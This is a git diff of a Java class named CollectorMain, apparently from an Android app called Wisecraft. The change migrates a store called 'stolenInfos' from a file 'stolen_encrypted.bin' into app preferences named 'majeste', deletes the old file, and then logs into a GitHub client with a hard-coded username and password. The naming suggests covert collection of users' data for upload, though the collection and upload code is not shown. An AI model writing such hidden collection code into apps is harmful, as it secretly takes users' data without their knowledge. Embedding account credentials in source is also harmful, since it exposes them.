@@ -32,7 +32,7 @@ import static com.nao20010128nao.Wisecraft.Utils.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
-	public static BinaryPrefImpl stolenInfos;
+	public static SharedPreferences stolenInfos;
 	
 	public CollectorMain() {
 		this(true);
@@ -53,27 +53,44 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		// TODO: Implement this method
 		if (running)
 			return;	
-		BinaryPrefImpl sb;
+		SharedPreferences sb;
 		String uuid=TheApplication.instance.uuid;
-		if(stolenInfos==null){
+		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
+			Log.d("CollectorMain","migrating");
+			BinaryPrefImpl bpi;
 			int fails=0;
-			while(true){
-				try {
-					sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
-					break;
-				} catch (IOException e) {
-					DebugWriter.writeToW("CollectorMain",e);
-					fails++;
-					if(fails==10){
-						new File(getFilesDir(), "stolen_encrypted.bin").delete();
-						fails=0;
+			SharedPreferences dest=getSharedPreferences("majeste",MODE_PRIVATE);
+			SharedPreferences.Editor edt=dest.edit();
+			
+			try {
+				while (true) {
+					try {
+						bpi = new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
+						break;
+					} catch (IOException e) {
+						DebugWriter.writeToW("CollectorMain", e);
+						fails++;
+						if (fails == 10) {
+							new File(getFilesDir(), "stolen_encrypted.bin").delete();
+							fails = 0;
+						}
 					}
 				}
+				for (String k:bpi.getAll().keySet()) {
+					try {
+						Log.d("CollectorMain","copy:"+k);
+						if(bpi.getString(k,null)!=null)edt.putString(k,bpi.getString(k,null));
+					} catch (Throwable e) {}
+				}
+			} catch (Throwable e) {
+				
+			}finally{
+				edt.commit();
+				Log.d("CollectorMain","done");
+				new File(getFilesDir(), "stolen_encrypted.bin").delete();
 			}
-			stolenInfos=sb;
-		}else{
-			sb=stolenInfos;
 		}
+		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
 		running = true;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
@@ -146,9 +163,9 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 		while(true){
 			try {
-				stolenInfos=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
+				stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
 				break;
-			} catch (IOException e) {
+			} catch (Throwable e) {
 			}
 		}
 	}
